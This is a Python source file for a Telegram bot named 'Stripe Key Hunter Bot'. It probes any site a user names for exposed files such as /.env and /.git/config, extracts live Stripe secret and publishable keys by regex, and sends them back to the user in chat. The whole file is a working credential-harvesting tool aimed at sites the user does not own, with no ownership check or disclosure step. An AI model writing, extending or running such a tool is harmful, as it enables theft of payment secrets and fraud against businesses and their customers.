import re
import requests
import os
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# === LOGGING ===
logging.basicConfig(level=logging.INFO)

# === CONFIG ===
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN not set!")

# === HELPERS ===
def scan_for_keys(url):
    found = {"pk": [], "sk": []}
    paths = [
        "/",
        "/.env",
        "/config.js",
        "/stripe.js",
        "/checkout.js",
        "/payment.js",
        "/static/js/main.js",
        "/api/config",
        "/.git/config",
    ]

    for path in paths:
        full_url = url.rstrip("/") + path
        try:
            resp = requests.get(full_url, timeout=10)
            if resp.status_code == 200:
                text = resp.text
                sk = re.findall(r"sk_live_[A-Za-z0-9]{24,}", text)
                pk = re.findall(r"pk_live_[A-Za-z0-9]{24,}", text)
                if sk:
                    found["sk"].extend(sk)
                if pk:
                    found["pk"].extend(pk)
        except requests.RequestException as e:
            logging.debug(f"Request to {full_url} failed: {e}")
            continue

    found["sk"] = list(set(found["sk"]))
    found["pk"] = list(set(found["pk"]))
    return found

# === COMMANDS ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Stripe Key Hunter Bot active.\n"
        "Send /scan <checkout_url> to extract keys.\n"
        "Example: /scan https://instantproxy.io/checkout"
    )

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /scan https://example.com/checkout")
        return

    url = context.args[0]
    if not url.startswith("http"):
        url = "https://" + url

    await update.message.reply_text(f"Scanning: {url} ...")

    result = scan_for_keys(url)

    reply = f"Scan complete for: {url}\n\n"

    if result["sk"]:
        reply += "Secret Keys (sk_live):\n"
        for k in result["sk"]:
            reply += f"{k}\n"
    else:
        reply += "No sk_live keys found.\n"

    if result["pk"]:
        reply += "\nPublishable Keys (pk_live):\n"
        for k in result["pk"]:
            reply += f"{k}\n"
    else:
        reply += "\nNo pk_live keys found.\n"

    # Telegram limits message length; split if needed
    for chunk in [reply[i:i+4000] for i in range(0, len(reply), 4000)]:
        await update.message.reply_text(chunk)

# === MAIN ===

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("scan", scan))
    logging.info("Bot starting...")
    app.run_polling()


if __name__ == "__main__":
    main()
